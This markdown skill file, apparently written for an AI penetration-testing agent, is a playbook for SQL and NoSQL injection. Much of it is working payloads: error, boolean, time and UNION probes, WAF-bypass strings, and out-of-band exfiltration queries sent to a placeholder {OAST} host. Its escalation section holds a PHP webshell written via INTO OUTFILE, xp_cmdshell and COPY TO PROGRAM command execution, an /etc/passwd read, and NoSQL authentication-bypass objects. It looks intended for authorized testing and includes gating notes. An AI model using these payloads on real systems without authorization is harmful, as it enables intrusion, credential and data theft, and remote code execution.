---
name: SQL Injection Testing
description: Detect and confirm SQL injection (error, boolean, time, union, stacked) across parameters, headers, and cookies, then prove DBMS impact safely.
tags: [web, injection, sqli, owasp-a03]
recommended_tools: [sqlmap_scan, arjun_parameter_discovery, http_repeater, http_intruder, nuclei_scan]
vuln_classes: [sqli]
domain: web
phase: exploitation
---
# SQL Injection Testing

SQLi lives anywhere user input reaches a SQL query. Test EVERY input, not just the obvious ones.

## Where to look
- **GET/POST params**: `id`, `user`, `search`, `q`, `filter`, `sort`, `order`, `category`, `page`, `limit`.
- **JSON/REST bodies**: every string AND numeric field; arrays (`{"ids":[1,2]}`), nested objects.
- **Headers**: `User-Agent`, `Referer`, `X-Forwarded-For`, `X-Forwarded-Host`, `Cookie` values, `Authorization`.
- **Order/limit clauses** (cannot be parameterised): `ORDER BY` and `LIMIT` injections need column-index payloads, not quotes.
- Use `arjun_parameter_discovery` FIRST to surface hidden params, then test each. Inject *with* the authenticated session — many sinks are post-login.

## Payload ladder: detect -> confirm -> escalate
1. **Break the query (error/differential)** — append in `http_repeater`:
   - `'`  then  `"`  then  `\`  then  `')`  then  `'))`  — watch for SQL errors, 500s, changed length.
   - Numeric context: `1`, `1 ` vs `1-0`, `1+0`, `1*1` (arithmetic that returns same row = injectable numeric).
   - Hard error confirm: `'; SELECT 1/0-- -` (divide-by-zero) or `' AND extractvalue(1,concat(0x7e,version()))-- -`.
2. **Boolean-blind** — compare TRUE vs FALSE response bodies/lengths:
   - `1' AND '1'='1` (true) vs `1' AND '1'='2` (false). Consistent length delta = blind SQLi.
   - Numeric: `1 AND 1=1` vs `1 AND 1=2`.
3. **Time-blind** (no visible output) — a delay proves it:
   - MySQL: `1' AND SLEEP(5)-- -` / `1' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -`
   - Postgres: `1'; SELECT pg_sleep(5)-- -` / `1' AND 1=(SELECT 1 FROM pg_sleep(5))-- -`
   - MSSQL: `1';WAITFOR DELAY '0:0:5'-- -`   Oracle: `1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -`
4. **UNION** (in-band extraction) — find column count, then extract:
   - `' ORDER BY 1-- -`, `2`, `3` … until error = column count.
   - `' UNION SELECT NULL-- -`, `NULL,NULL-- -` … until 200.
   - Confirm + banner: `' UNION SELECT @@version,current_user,3-- -` (MySQL/MSSQL) / `version(),current_user,3` (Postgres) / `banner,user,3 FROM v$version` (Oracle).
5. **Stacked** (where supported, e.g. MSSQL/Postgres): `1'; SELECT 1-- -` — read-only confirm only; no writes.

## WAF / filter bypass
- **Comments/whitespace**: `SE/**/LECT`, `UN/**/ION`, `/*!50000UNION*/ /*!50000SELECT*/`, `%0a`/`%09`/`%0c` for spaces, `+` for space in URL.
- **Case**: `SeLeCt`, `UnIoN`.  **Logic alt**: `||` for `OR`, `&&` for `AND`, `LIKE` for `=`.
- **Encoding**: URL-encode (`%27`), double-encode (`%2527`), hex literals `0x61646d696e` for strings, `CHAR(97,...)`.
- **No-quote/no-space**: `id=1/**/AND/**/1=1`, `id=0x...`, scientific `1e0`.
- **HPP**: send the param twice (`id=1&id=' OR 1-- -`) — WAF and app may parse different copies.

## Tool usage
- `sqlmap_scan` on the exact URL+param: `--cookie="<session>" --level=3 --risk=2 --batch --random-agent`. Add `-p <param>`, `--dbms=<x>` if known, `--technique=BEUST`. For headers: `--headers="X-Forwarded-For: *"`. Confirmation = `Parameter '<p>' is vulnerable` + the working payload; `--banner --current-user --current-db --dbs` print **DBMS banner / current user / available databases** (our deterministic proof). Do NOT `--dump`/`--os-shell` without HITL.
- `http_intruder` to fuzz a payload list across a param and diff lengths/timings (boolean & time-blind).
- `nuclei_scan` for known SQLi templates / error-string detection.

## Manual http_request example
```
GET /product?id=1'+UNION+SELECT+@@version,current_user,3--+- HTTP/1.1
Host: target
Cookie: session=<...>
```
Read the raw response for the version string + user rendered in-page = in-band proof.

## Proof to capture (verifier signals)
Capture one of: sqlmap **"is vulnerable"**, **"available databases"**, the **DBMS banner**, or **current user** — drive UNION/`--banner`/`--current-user` payloads to emit these. Plus the exact param, payload, and differential/error/timing.

## Chaining
Source-disclosure of creds -> auth bypass; `LOAD_FILE`/`INTO OUTFILE` (MySQL FILE priv) -> LFI/webshell -> RCE; extracted password hashes -> ATO. Stacked queries on MSSQL -> `xp_cmdshell` RCE.

**Safety**: enumeration/`--dump`/`--os-shell`/writes are destructive and HITL-gated; confirm injectability only. CWE-89.


<!-- Ingested from reference frameworks (skill-ingestion) -->
## OOB / blind SQLi exfil per DBMS (when in-band signal is dead)

Use when boolean/time is too slow or WAF-blocked. Force the DB to make an outbound DNS/HTTP/SMB request to your OAST host carrying extracted data in the subdomain label.

```
MySQL:    ' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.{OAST}\\a'))-- -
MSSQL:    '; EXEC master..xp_dirtree '\\{OAST}\a';-- -
Postgres: '; COPY (SELECT '') TO PROGRAM 'nslookup {OAST}';-- -
Postgres: '; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host={OAST} user=x password=x dbname=x');-- -
Oracle:   ' || (SELECT UTL_HTTP.REQUEST('http://'||user||'.{OAST}/') FROM dual) || '
Oracle:   ' || (SELECT UTL_INADDR.GET_HOST_ADDRESS('{OAST}') FROM dual) || '
```
```
sqlmap --dns-domain={OAST} -u 'http://target/page?id=1' --batch --dbs
```
Proof signal: interactsh/OAST DNS or HTTP hit whose subdomain label decodes to leaked data (version/user). Bind the `{OAST}` subdomain to a per-finding correlation id so the async callback maps back to the exact probe.

## SQLi -> RCE / filesystem escalation (after privilege confirmed)
```
MySQL:    ' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -
MySQL:    ' UNION SELECT LOAD_FILE('/etc/passwd')-- -
MSSQL:    '; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--   then  '; EXEC xp_cmdshell 'whoami';--
Postgres: '; COPY (SELECT '') TO PROGRAM 'whoami';-- -
```
Proof signal: written webshell returns command output (`uid=`/Windows user), or `COPY TO PROGRAM`/`xp_cmdshell` output reflected.

## 2024-era WAF bypass families (rotate when canonical payload 403/406s)
```
JSON wrap (in body):  {"id": "1' OR '1'='1"}
HPP:                  ?id=1&id=1' OR '1'='1
Header injection:     -H "X-Forwarded-For: 1' OR '1'='1"
MySQL ver-comment:    /*!50000UNION*/ /*!50000SELECT*/ 1,2,3
Scientific notation:  1e0UNION SELECT 1,2,3
Inline comment split: S/**/E/**/L/**/E/**/C/**/T
JSON func:            ' AND JSON_EXTRACT('{"a":1}','$.a')=1-- -
sqlmap tampers:       --tamper=space2comment,randomcase,charencode
```
Proof signal: a payload that previously returned 403/406 now triggers injectable behavior (error/boolean/time differential).

## Error-based fast version exfil (MySQL)
```
' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)-- -
MSSQL:  ' AND 1=CONVERT(int,@@version)-- -
```
Proof signal: version string appears between `0x7e` (`~`) delimiter markers in the error body.

## Deterministic proof discipline
Time-based confirmation requires a consistent ~5s delta vs baseline across repeated runs (single slow response is NOT proof). For boolean-blind, require TRUE response length/rows materially > FALSE twin, both HTTP 200. Effort budget: >=3 distinct payloads before declaring non-injectable; 8-10 bypass variants if mitigated.

## Modern techniques & real-world CVEs (via recon-skills)

Net-new material distilled from 12 disclosed bug-bounty / CVE reports (2021-2024), weighted toward NoSQL and ORM-bypass SQLi — the two families most under-represented in classic playbooks. Skip what's already covered above; the additions here are the modern CVE payloads, ORM raw-fragment sinks, NoSQL operator injection, and a few sleep/WAF variants not listed earlier.

### ORM raw-fragment SQLi (assume "using an ORM" != safe)

Modern apps drop to raw fragments for joins, reports, column selection, and sort — exactly where binding is impossible. Test any parameter that names a column, alias, JSON path, or sort key.

- **Django `QuerySet.values()` JSONField alias injection (CVE-2024-42005, CVSS 9.8)** — a JSON-path key passed as `*args` from a request became an unquoted SQL column alias. Server emitted `SELECT (data->>'…') AS "…"; DROP TABLE x;--"`.
  ```python
  Item.objects.values('data__"); DROP TABLE x;--')
  ```
  Probe: any endpoint that lets the client pick returned fields / JSONField keys (`?fields=`, `?values=`, GraphQL field selection backed by `.values()`). Django < 4.2.15 / < 5.0.8.
- **Sequelize raw-replacement / operator injection (GHSA-wrh9-cjv3-2hpw)** — attacker-controlled JSON reaches a `where` clause or `sequelize.literal()` / raw `replacements`. Inject via nested operator objects the same way as Mongoose below.
- **Root-cause tells** — in JS source hunting, flag raw concatenation and ORM escape hatches:
  ```bash
  grep -rE "query\s*\+=|WHERE.*\+|db\.query\(.*\+" src/
  grep -rn "sequelize\.literal\|\.query(|raw:\s*true|\$where" src/
  grep -rn "\.values(|extra(|RawSQL(" src/   # Django raw escape hatches
  ```

### NoSQL injection (MongoDB / Mongoose) — same logic, different parser

When the stack is Express/Node + Mongo (`X-Powered-By: Express`, JSON bodies, `param[]=` arrays), switch paradigms rather than declaring non-injectable.

- **Auth bypass / blind extraction via operator objects** — replace a scalar with an operator object in JSON, or use PHP/query-string bracket syntax:
  ```json
  {"username": {"$gt": ""}, "password": {"$gt": ""}}
  {"username": {"$regex": "^a"}, "password": {"$ne": ""}}
  {"$where": "this.username == this.password"}
  ```
  ```
  username[$ne]=invalid&password[$ne]=invalid
  username[$regex]=.*&password[$regex]=.*
  ```
- **Rocket.Chat pre-auth blind NoSQLi (CVE-2021-22911)** — a Meteor DDP method took a raw object selector into `findOne`; a `$regex` on the password-reset token leaked it char-by-char via a boolean/timing side-channel, chaining to admin reset -> RCE via integrations.
  ```json
  {"msg":"method","method":"getPasswordPolicy","params":[{"token":{"$regex":"^a"}}]}
  ```
- **Mongoose `$where` injection via `populate({match})` (CVE-2024-53900 + CVE-2025-23061, < 8.8.3)** — attacker JSON forwarded into `populate({match})` reached `$where`, running arbitrary server-side JS (blind exfil + DoS):
  ```javascript
  Model.find().populate({ path: 'author', match: { $where: "sleep(5000) || true" } })
  ```
- **NoSQL WAF bypass** — unicode-escape the operator/key so signature filters miss it (Mongo still parses it):
  ```json
  {"username": {"$gt": ""}}
  {"username": {"$gt": ""}}
  ```

### Second-order & auth-adjacent blind SQLi

- **Second-order (stored-then-rendered)** — inject into a field written to the DB (profile name, invite code, filename), then trigger the endpoint that reads it back into a raw query. First-order fuzzing misses these; track a marker payload from write to later read.
- **Mozilla `mozilla.social` invite endpoint, boolean-blind (H1 #2209130)** — invite-code lookup built a raw string against an OIDC-proxy Postgres backend; the "invalid code" vs "code accepted -> redirect" difference enabled schema enumeration:
  ```
  POST /invite  {"code":"abc' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"}
  ```
- **Salesforce SOQL second-order (HackerOne)** — SOQL has no comment/stacking, so extraction is boolean/`LIKE`-based on `%SOSL%` search and filter params; test any Salesforce-backed search where input flows into `WHERE ... LIKE`.

### Sleep-alternative & heavy-query time payloads (when SLEEP/pg_sleep are filtered)

```sql
MySQL:    ' AND BENCHMARK(5000000,MD5(1))-- -          -- CPU burn instead of SLEEP
MySQL:    ' AND GET_LOCK('a',5)-- -                     -- lock-wait delay
SQLite:   ' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))))=1-- -   -- heavy-compute stall (no SLEEP in SQLite)
```
Confirm with the same discipline as elsewhere: 5 trials at the payload vs 5 at baseline, non-overlapping timing — a single slow response or a sub-second delta is noise, not proof.

### Extra bypass primitives

- **Chunked transfer encoding** — set `Transfer-Encoding: chunked` and split the payload across chunks to defeat WAFs that inspect a reassembled body.
- **Authenticated-only surfaces** — WAFs frequently whitelist authenticated traffic; obtain a free/trial/low-priv account and inject via post-login endpoints (Apache Airflow filter/search pattern, often running with DB-superuser creds -> read/write + `COPY ... FROM PROGRAM` RCE).
- **Unicode quote substitute** — `ʼ` (U+02BC) where the app normalizes it back to `'`.

CWE-89 (SQLi) / CWE-943 (NoSQLi query-language injection).
